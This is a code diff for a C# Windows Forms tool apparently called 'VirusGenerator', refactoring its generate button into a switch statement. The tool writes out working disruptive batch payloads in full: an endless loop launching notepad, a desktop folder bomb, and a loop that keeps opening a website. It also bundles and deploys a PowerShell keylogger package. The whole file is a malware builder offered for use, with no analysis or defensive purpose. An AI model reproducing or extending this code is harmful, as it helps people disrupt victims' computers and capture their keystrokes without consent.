@@ -82,77 +82,82 @@ namespace VirusGenerator
             _fileName = TxtBoxFileName.Text;
             _fileExt = CBoxFor.Text;
 
-
-
-            //Where the magic happens.
-            if (CBoxAttack.Text == "Infinite Loop Attack" && _fileExt == ".bat")
+            if( _fileExt != "") 
             {
-                string[] infiniteLoopCmd = { "@echo off", ":loop", "start notepad.exe", "goto loop" };
-                File.WriteAllLines(_outputFolder + _fileName + _fileExt, infiniteLoopCmd);
-                ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
-            }
-            if (CBoxAttack.Text == "Folder Bomb Attack")
-            {
-
-                string[] folderBombAttackCmd = { "@echo off", "cd desktop", ":loop", "mkdir virus", "goto loop" };
-                File.WriteAllLines(_outputFolder + _fileName + _fileExt, folderBombAttackCmd);
-                ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
-            }
-
-            if (CBoxAttack.Text == "Keylogger")
-            {
-                if (!Directory.Exists(_outputFolder + "Get-Keystrokes"))
+                //Where the magic happens.
+                switch (CBoxAttack.Text)
                 {
-                    // Resource variables
-                    string getKeys = Properties.Resources.Get_Keystrokes;
-                    string readmeKeylogger = Properties.Resources.readmeKeylogger;
-                    string copyKeylogger = Properties.Resources.copyKeylogger;
+                    case "Infinite Loop Attack":
+                        string[] infiniteLoopCmd = { "@echo off", ":loop", "start notepad.exe", "goto loop" };
+                        File.WriteAllLines(_outputFolder + _fileName + _fileExt, infiniteLoopCmd);
+                        ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
+                        break;
 
-                    MessageBox.Show("Please note that this virus will only work with the name 'Get-Keystrokes', the name will automatically be changed for you.", "NOTICE");
+                    case "Folder Bomb Attack":
+                        string[] folderBombAttackCmd = { "@echo off", "cd desktop", ":loop", "mkdir virus", "goto loop" };
+                        File.WriteAllLines(_outputFolder + _fileName + _fileExt, folderBombAttackCmd);
+                        ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
+                        break;
 
-                    _fileName = "Get-Keystrokes"; //Auto switch the fileName and fileExt to what the keylogger requires.
-                    _fileExt = ".ps1";
+                    case "Keylogger":
+                        if (!Directory.Exists(_outputFolder + "Get-Keystrokes"))
+                        {
+                            // Resource variables
+                            string getKeys         = Properties.Resources.Get_Keystrokes;
+                            string readmeKeylogger = Properties.Resources.readmeKeylogger;
+                            string copyKeylogger   = Properties.Resources.copyKeylogger;
 
-                    string folderPath = _outputFolder + "Get-Keystrokes";
+                            MessageBox.Show("Please note that this virus will only work with the name 'Get-Keystrokes', the name will automatically be changed for you.", "NOTICE");
 
-                    Path.Combine(folderPath, _fileName);
-                    Directory.CreateDirectory(folderPath); //Create the directory.
+                            _fileName = "Get-Keystrokes"; //Auto switch the fileName and fileExt to what the keylogger requires.
+                            _fileExt = ".ps1";
 
+                            string folderPath = _outputFolder + "Get-Keystrokes";
 
-                    File.WriteAllText(folderPath + "\\" + _fileName + _fileExt, getKeys); //Write the readme, copy.bat and get-keystrokes.ps1 to the directory previously created.
-                    File.WriteAllText(folderPath + "\\" + "README.txt", readmeKeylogger);
-                    File.WriteAllText(folderPath + "\\" + "copy.bat", copyKeylogger);
-
-                    System.Diagnostics.Process.Start(folderPath);
-
-                    ToolStrip.Text = $"Folder created at {folderPath}";
-                }
-                else
-                {
-                    MessageBox.Show("The folder already exists!", "Notice");
-                    ToolStrip.Text = "Folder already exists!";
-
-                }
-
-            }
+                            Path.Combine(folderPath, _fileName);
+                            Directory.CreateDirectory(folderPath); //Create the directory.
 
 
-            if (CBoxAttack.Text == "Nyan Cat Bomb Attack")
+                            File.WriteAllText(folderPath + "\\" + _fileName + _fileExt, getKeys); //Write the readme, copy.bat and get-keystrokes.ps1 to the directory previously created.
+                            File.WriteAllText(folderPath + "\\" + "README.txt", readmeKeylogger);
+                            File.WriteAllText(folderPath + "\\" + "copy.bat", copyKeylogger);
+
+                            System.Diagnostics.Process.Start(folderPath); //This opens the folder after the virus is generated.
+
+                            ToolStrip.Text = $"Folder created at {folderPath}";
+                        }
+                        else
+                        {
+                            MessageBox.Show("The folder already exists!", "Notice");
+                            ToolStrip.Text = "Folder already exists!";
+                        }
+
+                        break;
+
+
+                    case "Nyan Cat Bomb Attack":
+                        MessageBox.Show("This attack only works in a '.bat' format. This will be done automatically for you.");
+
+                        _fileExt = ".bat";
+
+                        string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyan.cat", "goto loop" };
+                        File.WriteAllLines(_outputFolder + _fileName + _fileExt, nyanCatCmd);
+
+                        ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
+
+                        break;
+
+                } //End switch
+            } //end if
+            else
             {
-                MessageBox.Show("This attack only works in a '.bat' format. This will be done automatically for you.");
-
-                _fileExt = ".bat";
-
-                string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyan.cat", "goto loop" };
-                File.WriteAllLines(_outputFolder + _fileName + _fileExt, nyanCatCmd);
-
-                ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
-
-
+                MessageBox.Show("Having a filename is optional, but you MUST have a file format. \nPlease choose one and try again. :)", "Notice");
+                ToolStrip.Text = "Please choose a file format.";
             }
+            
 
 
-        }
+        } //Ends BtnGen_Click
 
         /// <summary>
         /// Purpose: Changes toolstrip text when the format is changed.
